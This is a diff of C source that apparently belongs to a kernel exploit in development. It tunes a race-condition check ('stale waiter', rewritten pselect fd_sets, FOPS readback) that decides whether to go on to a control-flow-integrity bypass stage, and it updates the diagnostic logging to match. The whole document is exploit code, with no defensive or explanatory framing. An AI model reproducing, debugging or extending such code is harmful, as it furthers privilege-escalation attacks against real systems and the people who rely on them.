@@ -2124,13 +2124,25 @@ static int slide_child_trigger_write(void) {
     usleep(1000);
   }
 #if defined(APP_S928_STABLE_RACE) && APP_S928_STABLE_RACE
+/* The pselect fdsets are backed by an unarmed timerfd, so pselect6 always
+ * returns its timeout, and slide_pselect_write_window is never published at
+ * all.  Either gate would skip try_cfi_stage() even when the rewrite landed.
+ * The consumer's sched call inside the pselect frame is the live signal that
+ * the fd_sets reached the stale waiter; the FOPS readback decides. */
+#if defined(APP_EZIF_VERIFY_PSELECT_TIMEOUT) && APP_EZIF_VERIFY_PSELECT_TIMEOUT
+  int result = atomic_load(&slide_waiter_ok) != 0 &&
+               atomic_load(&slide_consume_sched_ok) != 0;
 #if defined(APP_S928_ROUTE_DIAG) && APP_S928_ROUTE_DIAG
   int waiter_ok = atomic_load(&slide_waiter_ok);
-  int write_window = atomic_load(&slide_pselect_write_window);
-  int result = waiter_ok != 0 && write_window != 0;
+  int sched_ok = atomic_load(&slide_consume_sched_ok);
+#endif
 #else
   int result = atomic_load(&slide_waiter_ok) != 0 &&
                atomic_load(&slide_pselect_write_window) != 0;
+#if defined(APP_S928_ROUTE_DIAG) && APP_S928_ROUTE_DIAG
+  int waiter_ok = atomic_load(&slide_waiter_ok);
+  int sched_ok = atomic_load(&slide_pselect_write_window);
+#endif
 #endif
   atomic_store(&slide_route_stop, 1);
   SYSCHK(pthread_join(waiter, NULL));
@@ -2138,14 +2150,14 @@ static int slide_child_trigger_write(void) {
   SYSCHK(pthread_join(consumer, NULL));
 #if defined(APP_S928_ROUTE_DIAG) && APP_S928_ROUTE_DIAG
   if (!result) {
-    pr_info("S928 route result=0 waiter_ok=%d write_window=%d "
-            "route_done=%d consumer_seen=%d entered=%d sched_ok=%d "
+    pr_info("S928 route result=0 waiter_ok=%d sched_ok=%d "
+            "route_done=%d consumer_seen=%d entered=%d stack_window=%d "
             "calls=%d pselect_ret=%d pselect_errno=%d "
             "pselect_elapsed_usec=%llu\n",
-            waiter_ok, write_window, atomic_load(&slide_route_done),
+            waiter_ok, sched_ok, atomic_load(&slide_route_done),
             atomic_load(&slide_consume_seen),
             atomic_load(&slide_consume_enter_sched),
-            atomic_load(&slide_consume_sched_ok),
+            atomic_load(&slide_stack_write_window),
             atomic_load(&slide_consume_calls),
             atomic_load(&slide_pselect_last_ret),
             atomic_load(&slide_pselect_last_errno),
